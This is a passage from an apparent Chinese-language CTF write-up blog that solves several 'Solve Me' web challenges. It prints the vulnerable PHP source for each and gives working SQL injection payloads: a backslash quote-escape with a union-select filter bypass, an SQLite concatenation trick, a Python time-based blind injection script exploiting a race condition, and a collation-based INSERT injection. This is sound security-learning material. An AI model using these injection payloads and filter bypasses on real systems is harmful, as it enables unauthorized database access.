class="line">            <span class="string">'union[\s\xA0]+select|[\s\xA0](where|having)|'</span>.</span><br><span class="line">            <span class="string">'[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|'</span>.</span><br><span class="line">            <span class="string">'information_schema|procedure\s+analyse\s*/is'</span>,</span><br><span class="line">            $id.<span class="string">','</span>.$pw</span><br><span class="line">        ) <span class="keyword">and</span> <span class="keyword">die</span>(<span class="string">'Hack detected'</span>);</span><br><span class="line"></span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query(</span><br><span class="line">                $con, </span><br><span class="line">                <span class="string">"SELECT * FROM `antisqli` WHERE `id`='&#123;$id&#125;' AND `pw`=md5('&#123;$pw&#125;');"</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        mysqli_close($con);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">            <span class="keyword">if</span>($result[<span class="string">'no'</span>] === <span class="string">'31337'</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Hello, '</span>, $result[<span class="string">'id'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>简单说一下这段代码的意思，就是传进两个参数，然后进行过滤，然后进行数据库的查找，查找的结果里面如果含有<code>31337</code>的就可以成功输出flag了</p><p>这段代码里面有一个很吓唬人的过滤准则，但是其实里面存在小漏洞<br>    首先过滤了单引号啥的，注入一个单引号行不通，但是我们可以去掉一个单引号，如果要正则匹配\的话，正确的写法应该是 <code>|\\\\|</code>也就是说，反斜杠没有被过滤。这样我们可以注入反斜杠把id的第二个单引号给搞掉。这样一来就可以注入了<br>第二点就是他那个<code>union[\s\xA0]+select</code>把所有非空字符都过滤掉了，所以说直接上<code>union select</code>是不太行的,但是我们可以用<code>union all select</code>去绕过<br>然后是注释的问题，因为正则里面明确把<code>#</code>，还有<code>--加上空字符</code>过滤掉了，那我们用<code>--%1a</code>注释也是可以的<br>还有因为这里<code>order by</code> 也过滤了，只能手动去测试列数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>发现回显的是Login failed说明列数不对，再继续试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1,2 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>还是login failed,再继续试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1,2,3 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>这时候回显Hello了，代码逻辑跳到第一个if条件里面，说明有3列<br>然后我们直接上payload<br><code>?id=\&amp;pw=union all select 31337,2,3 from antisqli --%1A</code> 直接出flag<br>这里的语句在数据库里大概是这样的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`antisqli`</span> <span class="keyword">WHERE</span> <span class="string">`id`</span>=<span class="string">' \' and `pw` = md5('</span> <span class="keyword">union</span> all <span class="keyword">select</span> .... <span class="keyword">from</span> ... <span class="comment">--%1a</span></span><br></pre></td></tr></table></figure><p>重点是union all前面的语句为空，直接执行后面的语句，这太灵活了，又学到了</p><h3 id="Name-check"><a href="#Name-check" class="headerlink" title="Name check"></a>Name check</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">       $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">"/admin|--|;|\(\)|\/\*|\\0/i"</span>, $name))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Not allowed input'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $sql = <span class="keyword">new</span> SQLite3(<span class="string">'name_check.db'</span>, SQLITE3_OPEN_READWRITE);</span><br><span class="line">       $res = $sql-&gt;query(<span class="string">"</span></span><br><span class="line"><span class="string">           SELECT </span></span><br><span class="line"><span class="string">           MAX('0','1','&#123;$name&#125;') LIKE 'a%', </span></span><br><span class="line"><span class="string">           INSTR('&#123;$name&#125;','d')&gt;0, </span></span><br><span class="line"><span class="string">           MIN('&#123;$name&#125;','b','c') LIKE '__m__', </span></span><br><span class="line"><span class="string">           SUBSTR('&#123;$name&#125;',-2)='in'</span></span><br><span class="line"><span class="string">       ;"</span>);</span><br><span class="line">       <span class="keyword">if</span>($res === <span class="keyword">false</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Database error'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $row = $res-&gt;fetchArray(SQLITE3_NUM);</span><br><span class="line">       <span class="keyword">if</span>(</span><br><span class="line">           $row[<span class="number">0</span>] + $row[<span class="number">1</span>] + $row[<span class="number">2</span>] + $row[<span class="number">3</span>] !== <span class="number">4</span> ||</span><br><span class="line">           array_sum($row) !== <span class="number">4</span> </span><br><span class="line">       )&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Auth failed'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> $flag;</span><br><span class="line"></span><br><span class="line">   quit:</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>我没玩过sqlite，但是感觉这里一定要满足admin这个东西，因为query函数后面的东西，但是这里的过滤是正整一个词的过滤，但是我们可以用sqlite的连接词<code>||</code>去实现绕过，但是对于mysql字符串的拼接只能用<code>concat</code>函数去拼接<br>所以最后的payload：<code>ad&#39;||&#39;min</code></p><h3 id="I-am-slowly"><a href="#I-am-slowly" class="headerlink" title="I am slowly"></a>I am slowly</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// It's 'I am slowly' problem of 'Solve Me'.</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">    $table = <span class="string">'iamslowly_'</span>.ip2long($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    $answer = $_GET[<span class="string">'answer'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($answer))&#123;</span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, <span class="string">"SELECT `count` FROM `&#123;$table&#125;`;"</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);"</span>);</span><br><span class="line">            $new_answer = md5(sha1(<span class="string">'iamslowly_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand()));</span><br><span class="line">            mysqli_query($con, <span class="string">"INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES ('&#123;$new_answer&#125;',1);"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">elseif</span>($result[<span class="string">'count'</span>] === <span class="string">'12'</span>)&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Game over'</span>;</span><br><span class="line">            <span class="keyword">goto</span> quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $randtime = mt_rand(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, <span class="string">"SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`='&#123;$answer&#125;';"</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result) &amp;&amp; $result[<span class="string">'answer'</span>] === $answer)&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"UPDATE `&#123;$table&#125;` SET `count`=`count`+1;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Go fast'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">quit:</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这个题目也是很骚，我第一次遇见这一种类型的题目，利用来了php以及mysql之间的延时关系去绕过那一个可恶的12.。。<br>但是执行过程过于缓慢啊，主要是两个延时太过耗时<br>概述一下这题目的意思传参进去之后，如果没有对应的表就根据你的ip创建一个表，并且这个表里面含有一个名为COUNT的字段，初始值为1，后面就一直往这里面的COUNT+1，如果到12的话就会把表删掉重新再新建一个表，所以关键是他的逻辑顺序出了错误。</p><p><code>判断count的值–&gt;执行SQL语句–&gt;加count值</code></p><p>这个逻辑在执行语句的时候有问题，当count=11的时候，我们执行一个sleep()时间很长的语句，该请求就会长时间停在 执行SQL语句 流程中，如果此时我们再发起一次正常请求，判断count值还是11，执行完SQL语句之后count+1=12，再当上一条SQL语句执行完毕后count再加1等于13，于是之后就可以无限制提交请求了，然后在利用盲注来获得answer，这确实骚气<br>小脚本，最好还是把header啥的都弄进去，毕竟是靠ip建表的，这个东西跑得很慢不值得，而且一直都跑的错的答案，QAQ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">keys = <span class="string">'0123456789abcdef'</span></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"iamslowly.thinkout.rf.gd"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0"</span>,</span><br><span class="line">     <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">     <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">      <span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,</span><br><span class="line">      <span class="string">"Referer"</span>: <span class="string">"http://iamslowly.thinkout.rf.gd/"</span>,</span><br><span class="line"><span class="string">"Cookie"</span>: <span class="string">"__test=4e8126e93f7b5a4448c7e3c1f0b7853e"</span>,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,</span><br><span class="line">      <span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">        url = <span class="string">"http://iamslowly.thinkout.rf.gd/?i=1&amp;answer=' or if((answer like '&#123;&#125;%'),sleep(30),2)%23"</span>.format(payload + j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = requests.get(url,headers=header,timeout=<span class="number">29</span>).content</span><br><span class="line">            <span class="comment">#print(content[:10])</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+]Waiting!'</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            payload += j</span><br><span class="line">            print(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="Cheap-Lottery"><a href="#Cheap-Lottery" class="headerlink" title="Cheap Lottery"></a>Cheap Lottery</h3><p>这个题目一开始用扫描器扫一下发现里面存在robots.txt打开发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /backup/</span><br></pre></td></tr></table></figure><p>进去backup发现几个文件</p><p>一个数据库文件，还有一份源码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`lottery`</span> (</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">char</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`time`</span> <span class="built_in">int</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`nums`</span> <span class="built_in">char</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`lottery`</span></span><br><span class="line">  <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span> <span class="string">`name`</span> (<span class="string">`name`</span>);</span><br></pre></td></tr></table></figure><p>作为菜鸟感觉是SQL注入，但无从下手，知道发现原来方方土学长早就写过这题的题解<a href="https://www.anquanke.com/post/id/101939" target="_blank" rel="noopener">https://www.anquanke.com/post/id/101939</a><br>这波骚操作还是6，运用了字符集去绕过</p><p>而且p神也发过类似的文章(tql,QAQ)<br><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p><p>先讲一下这一段代码的意思，发现骆骆大佬早就做过这题而且流程图都画好了，我就直接贴图吧。。简单粗暴<br><img src="https://s1.ax1x.com/2018/04/03/CpBkLt.png" alt="这里写图片描述"></p><p>我们要利用的点就是这一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$nums = preg_replace(<span class="string">"/[a-zA-Z\[\]\=]/"</span>, <span class="string">""</span>, $url_query);</span><br><span class="line">$nums = strtr($nums, <span class="string">"&amp;"</span>, <span class="string">","</span>);</span><br><span class="line">$sql-&gt;query(<span class="string">"INSERT INTO `lottery`(`name`, `time`, `nums`) VALUE('&#123;$name&#125;', '&#123;$time&#125;', '&#123;$nums&#125;');"</span>);</span><br></pre></td></tr></table></figure><p>这段代码往数据库里面添加数据，只要我们往里面添加自己规定的值，然后再在另一处以同一ip地址进行访问(不购买)不就可以直接进到check模块了。。<br>意思就是这样<br>开始数据库里面是这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `lotter` (`name`,`time`,`nums`) VALUES (<span class="string">'guest_1.1.1.1'</span>,<span class="string">'time()'</span>,<span class="string">'69,69,69,69,69'</span>);</span><br></pre></td></tr></table></figure><p>后来我们构造，使数据库一开始就存在这样的值，我们下一次访问的时候就名正言顺的是买正确了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `lotter` (`name`,`time`,`nums`) VALUES (<span class="string">'guest_1.1.1.1'</span>,<span class="string">'time()'</span>,<span class="string">'69'</span>),(<span class="string">'admin1.1.1.1'</span>,<span class="string">'$time'</span>,<span class="string">'69,69,69,69,69'</span>),(<span class="string">'guest_1.1.1.1'</span>,<span class="string">'$time'</span>,<span class="string">'69,69,69,69,69'</span>)<span class="comment">#',69,69,69,69');</span></span><br></pre></td></tr></table></figure><p>就可以名正言顺地使<code>bingo</code>这个值等于5，然后就输出flag了，也就是进入下面这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$bingo = <span class="number">0</span>;</span><br><span class="line">$nums_admin = explode(<span class="string">","</span>, $row_admin[<span class="string">'nums'</span>]); <span class="comment">// admin_*</span></span><br><span class="line">$nums_guest = explode(<span class="string">","</span>, $row_guest[<span class="string">'nums'</span>]); <span class="comment">// guest_*</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">5</span>; ++$i)&#123;</span><br><span class="line"><span class="keyword">for</span>($k = <span class="number">0</span>; $k &lt; <span class="number">5</span>; ++$k)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($nums_admin[$i], $nums_guest[$k]) &amp;&amp; $nums_admin[$i] === $nums_guest[$k])&#123;</span><br><span class="line">++$bingo;</span><br><span class="line"><span class="keyword">unset</span>($nums_guest[$k]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($nums_admin, $nums_guest);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($bingo == <span class="number">5</span>)&#123; <span class="comment">// correct all</span></span><br><span class="line">$msg = <span class="string">"Perfect! The flag is &lt;code&gt;&#123;$flag&#125;&lt;/code&gt;."</span>;</span><br></pre></td></tr></table></figure><p>但是我们要网关键的代码注入自己想要的东西，就必须得绕过字母这个步骤，这里开始及牵涉到字符集的问题了。</p><p>总结一下那几篇博客看到的点<br>MySQL中的字符集转换过程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</span><br><span class="line">2. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</span><br><span class="line">使用每个数据字段的CHARACTER SET设定值；</span><br><span class="line">• 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；</span><br><span class="line">• 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</span><br><span class="line">• 若上述值不存在，则使用character_set_server设定值。</span><br><span class="line">3. 将操作结果从内部操作字符集转换为character_set_results</span><br></pre></td></tr></table></figure></p><p>也就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">character_set_client -&gt; character_set_connection -&gt; 内部操作字符集</span><br></pre></td></tr></table></figure><p>而且p神说的在MySQL里面的utf-8是阉割版，最长只支持三个字节，<br>如果你需要Mysql支持四字节的utf-8，可以使用utf8mb4编码。<br>但是这个点跟这题无关，这个点用在让数据库误认为该字母不存在直接舍弃掉的情况</p><p>第二个点是<br>mysql 有两个支持 unicode 的 character set:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ucs2: 使用 16 bits 来表示一个 unicode 字符。</span><br><span class="line">utf8: 使用 1~3 bytes 来表示一个 unicode 字符。</span><br></pre></td></tr></table></figure><p>而在本题目中，sql文件中显示</p><p><code>ENGINE=InnoDB DEFAULT CHARSET=utf8;</code></p><p>很显然这里是utf8，而我们一般数据库默认使用的是utf8_general_ci，而ci是指case insensitive的缩写，即大小写不敏感</p><p>这样也表明了为什么平常我们在cmd命令行下写数据库命令不区分大小写了</p><p>根据方方土学长所说的，这种模式由于diacritic ordering的排序问题使得读音符号最后被认定为英文字母</p><p>也就是对于utf8_general_ci，认为以下样例是相等的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ä = A</span><br><span class="line">Ö = O</span><br><span class="line">Ü = U</span><br></pre></td></tr></table></figure><p>而且还给出了这个超级腻害的表<br><a href="http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html" target="_blank" rel="noopener">http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html</a><br>表格上方是 unicode 编码，下方是 utf8 编码</p><p>然后构造一下admin还有guest</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin: %C3%A4%C4%8F%E1%B8%BF%C3%AF%C3%B1</span><br><span class="line">guest: %C4%9D%C3%B9%C3%A8%C5%9B%C5%A3</span><br></pre></td></tr></table></figure><p>Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$vps_ip = <span class="string">'你的vps地址'</span>;</span><br><span class="line">$time = time();</span><br><span class="line">    $url = <span class="string">"http://cheaplottery.solveme.peng.kr/index.php?lottery%5BA%5D=1'),('%C3%A4%C4%8F%E1%B8%BF%C3%AF%C3%B1_"</span>.$vps_ip.<span class="string">"','&#123;$time&#125;','1,1,1,1,1'),('%C4%9D%C3%B9%C3%A8%C5%9B%C5%A3_"</span>.$vps_ip.<span class="string">"','&#123;$time&#125;','1,1,1,1,1')%23&amp;lottery%5BB%5D=&amp;lottery%5BC%5D=&amp;lottery%5BD%5D=&amp;lottery%5BE%5D="</span>;</span><br><span class="line">    <span class="keyword">echo</span> $url;</span><br></pre></td></tr></table></figure><p>然后在你的vps上再curl一下就得到flag了</p><p><a href="https://imgchr.com/i/P2t4AI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P2t4AI.md.png" alt="P2t4AI.md.png"></a></p><h3 id="Check-via-eval"><a href="#Check-via-eval" class="headerlink" title="Check via eval"></a>Check via eval</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    $exam = <span class="string">'return\''</span>.sha1(time()).<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;a href="./?flag='</span>.$exam.<span class="string">'"&gt;Click here&lt;/a&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'flag'</span>]) != strlen($exam)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed length'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is'</span>, $_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed keyword'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>($_GET[<span class="string">'flag'</span>]) === sha1($flag)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'What\'s going on?'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span 